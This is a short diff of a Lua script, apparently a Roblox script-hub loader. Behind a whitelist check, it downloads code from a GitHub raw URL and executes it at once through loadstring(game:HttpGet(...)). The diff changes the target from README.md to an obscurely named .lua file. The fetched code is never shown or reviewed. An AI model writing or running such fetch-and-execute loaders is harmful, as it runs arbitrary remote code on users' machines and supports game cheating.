@@ -105,7 +105,7 @@ end
 
 
 if whilelist == true then
- loadstring(game:HttpGet("https://raw.githubusercontent.com/Xpen25Y/DataHub12/main/README.md"))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/Xpen25Y/DataHub12/main/djslkfjlsvjlksdfj.lua"))()
 else
     print ("No Script !!!")
 end
